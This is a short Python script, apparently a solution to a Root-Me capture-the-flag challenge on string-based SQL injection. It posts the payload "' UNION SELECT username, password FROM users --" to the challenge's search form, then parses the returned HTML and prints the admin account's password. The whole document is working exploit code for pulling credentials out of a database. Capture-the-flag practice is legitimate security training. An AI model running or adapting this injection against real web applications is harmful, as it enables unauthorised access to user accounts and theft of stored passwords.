# 19 SQL - String
# Solution: SQL injection using UNION SELECT, single quote inject '
import requests
from bs4 import BeautifulSoup

url = "http://challenge01.root-me.org/web-serveur/ch19/?action=recherche"
payload = "' UNION SELECT username, password FROM users --"
data = {'recherche': payload}

response = requests.post(url, data=data)
soup = BeautifulSoup(response.content, 'html.parser')
b_tags = soup.find_all('b')
for tag in b_tags:
    if tag.text == "admin":
        password = tag.next_sibling.strip("() ")
        print(password)
        break